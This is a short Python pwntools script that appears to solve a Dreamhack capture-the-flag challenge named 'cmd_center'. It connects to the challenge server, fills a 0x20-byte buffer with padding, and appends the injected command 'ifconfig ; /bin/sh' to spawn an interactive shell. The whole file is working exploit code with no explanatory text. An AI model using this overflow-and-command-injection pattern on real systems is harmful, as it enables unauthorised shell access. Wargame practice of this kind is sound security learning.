from pwn import *

p = remote("host1.dreamhack.games", 10593)
e = ELF("./cmd_center")
# libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")

# gdb.attach(p)
def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.log_level = 'debug'

cmd_ij = b"ifconfig ; /bin/sh"
payload = b"A"*0x20+cmd_ij

p.sendafter(":",payload)

p.interactive()